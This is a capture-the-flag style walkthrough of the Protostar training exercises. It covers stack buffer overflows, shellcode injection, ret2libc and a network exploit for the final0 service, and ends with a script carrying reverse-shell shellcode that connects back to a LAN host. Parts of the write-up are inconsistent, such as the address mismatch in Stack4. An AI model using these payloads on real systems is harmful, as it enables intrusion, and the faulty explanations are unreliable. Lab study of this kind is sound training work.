### Stack0

To modify variable we need to overwrite space on buffer[64] \
`user@protostar:/opt/protostar/bin$ (python -c "print 'a'*65") | ./stack0` \
`user@protostar:/opt/protostar/bin$ you have changed the 'modified' variable`\

We write 65 here, because 64 not overload the stack

### Stack1

Now we need modify the specific value (  0x61626364  ~ "dcba") \
So. Let's check what will happen if we write into buffer as in previous task:\
`./stack1 'python -c "print ('a' * 65)"'`\
`Try again, you got 0x00000061`

Ok. now It's better, we know that we can overwrite buffer. Continue with our value: \
`./stack1 'python -c "print ('a' * 64 + 'dcba')"'`

We remove one char with 'a', because we need overloading starts with 'dcba' value\
Now we will get: \
`you have correctly got the variable to the right value`

### Stack2

Here we have fun thing with env vars -- actually command python also is env var. So. \
When we would try to create env var with value like `python 'print (A)'` it will be \
processed as a command. Let's try it out:\
`GREENIE = 'python -c "print ('A' * 64 + '\x0a\x0d\x0a\x0d')'`

Check what we do:
`echo $GREENIE` \
What we get: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

Okay, now we need to call the **_./stack2_** and checj how it will work for us \
call --> ` ./stack2` \
`you have correctly modified the variable` \
Great job!

### Stack3

Now we have pointer fp on function that don't exist while in the fp only value is written \
and func win() that should be called. \
At first we should find out where our win function stored in memory. \
With this objdump tool can help us. As long as our virual machine is run on Debian OS \
we should use following command : \
`apt-get install binutils-i586-linux-gnu`\
call : `objdump -x stack3 | grep win`, where -x is flag to show all headers of obj \
result: `08048424 g     F .text  00000014              win` \
So now we know address of win ~ 0x08048424. And our task is only to overwrite fp with this value \
We know that we store data in Little Indian, so... \
as in previous tasks we need buffer with size 64 in a char and our address in hex

` (python -c "print 'a'*64 + '\x24\x84\x04\x08'";) | ./stack3`

Output:\
`calling function pointer, jumping to 0x08048424`\
`code flow successfully changed`

Yes! We got this.

### Stack4

Okay, now we have no value to overwrite. So only thing that we could do is to overwrite the\
return address of the main function. It's stored in the stack in the start of frame.

So we should bound the dedicated to main func stack size. How we can do this? we will try to increase size of the
buffer \
until we will get the segmentation fault. \
Spoiler: that will be size of 76.\
`(python -c "print 'a'*76";) | ./stack4`

Cool, now we only need the address of win() to write it onto the return function point \
we can do in the same way as in the Stack3 task. Address: 0x08048424

`(python -c "print 'a'*76 + '\xf4\x83\x04\x08'";) | ./stack4`

output: `code flow successfully changed` \
Well done! Let's move to the nex task

### Stack5

Now there is no win function. We should open shell as the result. (OMG) \
For this task we will use the shell code from the web (as recommended in task)\
`code = \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80`\
Firstly, Let's try out to identify buffer size for this task.

Now let's use tool for debugging program while it's processing gdb \
On the next line we create breakpoint for the main function:\
`gdb stack5`\
`(gdb) b main`\
Output: `Breakpoint 1 at 0x80483cd: file stack5/stack5.c, line 10.`

So now when the program will be run we'd have an opportunity to see how it's going\
`(gdb) run`

Okay the message point us that there in no stack, then... where it is?\
Examine ESP (pointer to the stack top) return point to check this out.\
`p $esp`\
`$1 = (void *) 0xbffff750`

Now we know where our buffer is in memory. Interesting: as it is defined just after main\
is called, meaning it will be around where ESP is. At least approximately\
But for our task it's enough

Why?

Because we can't just overwrite EIP on 0xbffff750 with shellcode to get expected result.\
Hole thing is that the using of gdb changes a structure of the stack a little, so desirable\
address will be moved.

What we can do?

We can try out many addresses in loop until it works, BUT. There is no fun in this way \
So we decided to try out solution with NOPs (no-operators). A single character that \
"says" to computer go to the next operation in stack. \
Our decision is: to overwrite buffer, set instructions with nops, overwrite EIP\
and write shellcode after this\

Here is actual command in the shell:

` (python -c "import sys; sys.stdout.write(`
filling buffer until EIP
`'\x90'*76`\
Address to overwrite EIP
` + '\x00\xf8\xff\xbf'`\
NOPs
`+ '\x90'*30 +`\
shellcode
`'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')";) | ./stack5`

Great job. Let's move further!

### Stack6

In this task as in previous one we have buffer to overflow (good)\
But the problem is in these lines:\

```c++
  if((ret & 0xbf000000) == 0xbf000000) {
                printf("bzzzt (%p)\n", ret);
                _exit(1);
        }
```

Here the program checks that the return address is not in the stack\
So we cannot perform shellcode injection\

As alternative, we will use the ret2libc methodology.\
The main idea is call functions that exist in C++ libs like system() and exit() to get a shell\
Now our way to success will look like: \

make padding -> address of ```system()``` -> ***bin/sh***\
Let's do this!

Another thing that worth remaining is that stack6 will be executed as root\
Why? Because it's suid binary. We can check this:

`find /opt/protostar/bin/ -perm -4000 | grep stack6`\
Output: `/opt/protostar/bin/stack6`

When system() will be called we need to pass the 'bin/sh' as argument \
The best way (as we think) to do that is to get it from the libc.

To find out it's location we will need to use strings tool.\
Go to the / folder and run:\
`strings -t d ./lib/libc.so.6 | grep /bin/sh`\
Output is our offset: `1176511 /bin/sh`

But we also need to know the address where libc starts:\
`gdb ./stack6`\
`run`
`info proc map`\

And here we have address where libc starts: `0xb7e97000`

Now to determine buffer size we will use metasploit-framework.\
Actually only 2 commands from here -- pattern_create (create random pattern with fixed length)\
pattern_offset -- finding offset between two addresses.

`./pattern_create.rb -l 100`\
Generated pattern: `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`

`gdb ./stack6 `\
`break * main`\
`run`\
`c`\
Enter our pattern and get the address when the program receive\
Segmentation fault error - 0x37634136.

Now we can use pattern_offset to check the size of buffer
`./pattern_offset.rb -q 0x37634136`\
Output: `[*] Exact match at offset 80`

So we know that after 80 chars the buffer overflows\
Great. Next thing to check the address of the `system()` function.\

`r`\
`p system`\
Output: `$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>`\
`p exit`\
Output: `$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>`\

Perfect. On the code below we will struct our char sequence to write into memory
```python
import struct

buffer = "A" * 80
system = struct.pack("I" ,0xb7ecffb0)
padding = "AAAA"
shell = struct.pack("I" ,0xb7e97000+1176511)

print buffer + system + padding  + shell
```

Then execute script:
`(python /tmp/stack6.py; cat) | ./stack6`\

And we got the shell!!! Great.


### Final0

Wow. Here we have the server that we can run with the port. and then check is user presented\
And the first thing that we should do is definitely try to run this.\
`nc localhost 2995`\
Output: `ekate`\
`No such user EKATE`

Okay. So what we have here? we have the buffer of 512 chars that overwrites with the `gets()` (we already know that \
it isn't secure enough). We need to open shell. BUT there are one interesting thing -- in the get_username \
all `\r` and `\n` are replaced by NULL and, after that there is `toupper()` function that produces issues.\
Why? Because instructions of the shell prompt have chars that can be modified by `toupper()`, and it's\
will break our instructions.

Never might, still have to bound the buffer to overwrite the return point.\
We can find it out with gdb.\
`gdb final0`\
Disassemble main function: `disas main`\
Output:\
```commandline
...
0x08049874 <main+65>:   call   0x804975a <get_username> 
0x08049879 <main+70>:   mov    %eax,0x1c(%esp) 
0x0804987d <main+74>:   mov    $0x8049c7b,%eax ; NO SUCH USER MESSAGE
0x08049882 <main+79>:   mov    0x1c(%esp),%edx
0x08049886 <main+83>:   mov    %edx,0x4(%esp)
0x0804988a <main+87>:   mov    %eax,(%esp)
0x0804988d <main+90>:   call   0x8048bac <printf@plt> ; ouput something
...
```

Great, so let's move to the get_username function and check what happens inside:\
`disas get_username`\
Output:\
```commandline
...
0x08049764 <get_username+10>:   movl   $0x200,0x8(%esp) ; buffer size (512)
0x0804976c <get_username+18>:   movl   $0x0,0x4(%esp) ; value to fill the buffer 
0x08049774 <get_username+26>:   lea    -0x210(%ebp),%eax ; actually buffer
...
; and here it is out vulnerability:
0x08049782 <get_username+40>:   lea    -0x210(%ebp),%eax ; buffer
0x08049788 <get_username+46>:   mov    %eax,(%esp)
0x0804978b <get_username+49>:   call   0x8048aac <gets@plt> ; get user input
...
```

'Cause of the protostar have broken sudo dependencies, and we cannot install any additional utility\
we decided to use following facts
- `gets()` can be terminated by using `0xa` or `EOF`, (that will allow as to add null bytes and `0xd` in the middle)
- the loop for uppercase username uses `strlen()` to locate end of the buffer (this function based on the terminating null byte)

Thus, if we were to place the 0xd or 0x0 bytes somewhere before\
the beginning of the shellcode, we would effectively terminate\
the upper-case loop at that point. \

BUT, because of 0xa is used to terminate gets() input we are stuck with having this byte at the very end and \
must not use it anywhere else in the payload.

Let's check if our tricks will have some result.\
Small code reference here:
```python
import sys, socket
from struct import pack, unpack
from binascii import hexlify

HOST = sys.argv[1]
PORT = 2995
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

packet = "iphelix\x0d" + "a"*500 + "\x0a"
print hexlify(packet)  # print packet in hex

s.sendall(packet)

data = s.recv(1024)
print "%s" % data    # print the confirmation

s.close()
```

Then move back to the /opt/protostar/bin and check the status of final0:\
`ps aux | grep final0`\
Okay now we know the id of the process -- `1496`
Now we can move to the running final with attaching to current process:
`su`\
`gdb ./final0 -p 1496`








`nano /tmp/break_server.py`\
Code: \
```python
from socket import *

s = socket()
# connect to server
s.connect(("127.0.0.1", 2995))
# overflow buffer
s.send("A"*532 + "B"*4)
s.close()
```

Go to /tmp and run out script ***break_server.py*** with debugger\
with enabled report of all current processes
` ps aux | gdb final0`\
now we can debug the result: \
`gdb -q -c core.11.final0.2075`\
Where -c -- corresponds as flag to process core file and -q -- quiet set up\
`x/20x $esp-0x228`
Now we get the address of the return

```python
import socket

#http://www.shell-storm.org/shellcode/files/shellcode-883.php
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89" \
"\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x38\x66\x66\x68\x05\x39\x43" \
"\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59" \
"\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68" \
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

s = socket.socket()
s.connect(("192.168.0.102",2995))


payload = "oops\r" + "\x90"*100 + shellcode + "\x90"*(532 - len(shellcode) - 100 - 5) + "\x80\xfa\xff\xbf" + "\n"

s.send(payload)
print(s.recv(1024))
s.close()
```



